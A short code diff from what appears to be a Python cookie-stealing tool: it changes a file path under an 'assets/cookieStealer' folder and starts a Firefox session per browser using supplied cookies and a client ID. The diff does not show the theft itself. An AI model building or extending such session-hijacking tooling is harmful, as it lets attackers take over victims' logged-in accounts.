@@ -90,7 +90,7 @@ def start_session(browser, cookies, client_id, assets):
                 pass
     profile = FirefoxProfile(path_to_profile)
     driver_chrome = webdriver.Firefox(profile)
-    ready_html = 'file://'+os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'ready.html').replace('\\', '/')
+    ready_html = 'file://'+os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', '{}-ready.html'.format(browser)).replace('\\', '/')
     driver_chrome.get(ready_html)
 threads = {}
 for browser in cookies.keys():
